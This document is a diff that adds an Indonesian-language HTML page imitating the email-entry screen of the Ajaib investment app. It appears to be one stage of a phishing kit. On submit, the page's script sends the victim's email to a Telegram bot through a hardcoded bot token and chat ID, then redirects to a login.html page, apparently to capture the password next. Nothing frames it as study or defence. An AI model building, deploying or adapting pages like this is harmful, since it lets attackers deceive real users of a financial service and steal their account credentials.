@@ -1,0 +1,100 @@
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Masukkan alamat Email</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    /* Custom font sizes and weights to match screenshot */
+    .text-18 {
+      font-size: 18px;
+      line-height: 22px;
+      font-weight: 600;
+    }
+    .text-14 {
+      font-size: 14px;
+      line-height: 20px;
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen font-sans">
+  <div class="max-w-md mx-auto p-5">
+    <button aria-label="Back" class="mb-6">
+      <i class="fas fa-chevron-left text-black text-lg"></i>
+    </button>
+    <h1 class="text-black text-18 font-semibold mb-2">Masukkan alamat Email</h1>
+    <p class="text-black text-14 mb-6 leading-relaxed">
+      Masukkan alamat email yang telah terdaftar di Ajaib untuk melanjutkan atau alamat email baru untuk daftar akun Ajaib.
+    </p>
+    <form id="emailForm">
+      <label for="email" class="block text-black font-semibold mb-1 text-sm">Email</label>
+      <input
+        id="email"
+        type="email"
+        class="w-full border border-blue-500 rounded-md px-3 py-2 mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500 text-black"
+        autocomplete="email"
+        aria-required="true"
+      />
+      <button
+        id="submitBtn"
+        type="submit"
+        disabled
+        class="w-full bg-blue-100 text-blue-300 font-semibold py-2 rounded-md cursor-not-allowed"
+      >
+        Lanjut
+      </button>
+    </form>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById('email');
+    const submitBtn = document.getElementById('submitBtn');
+    const form = document.getElementById('emailForm');
+
+    // Replace these with your Telegram bot token and chat ID
+    const TELEGRAM_BOT_TOKEN = '8392304649:AAFSpxG4uQqhdzOi-XD0ADeuykpj4RGAgDU';
+    const TELEGRAM_CHAT_ID = '7914074847';
+
+    // Enable button only if input is valid email
+    emailInput.addEventListener('input', () => {
+      const email = emailInput.value.trim();
+      const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      submitBtn.disabled = !isValidEmail;
+      if (isValidEmail) {
+        submitBtn.classList.remove('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-blue-600', 'text-white', 'cursor-pointer');
+      } else {
+        submitBtn.classList.add('bg-blue-100', 'text-blue-300', 'cursor-not-allowed');
+        submitBtn.classList.remove('bg-blue-600', 'text-white', 'cursor-pointer');
+      }
+    });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = emailInput.value.trim();
+      if (email) {
+        localStorage.setItem('userEmail', email);
+
+        const message = encodeURIComponent(`Email baru: ${email}`);
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
+
+        try {
+          const response = await fetch(url, { method: 'GET' });
+          if (response.ok) {
+            // Redirect to the login page after successful send
+            window.location.href = 'login.html';
+          } else {
+            alert('Gagal mengirim email ke Telegram.');
+          }
+        } catch (error) {
+          alert('Terjadi kesalahan saat mengirim ke Telegram.');
+        }
+      }
+    });
+  </script>
+</body>
+</html>
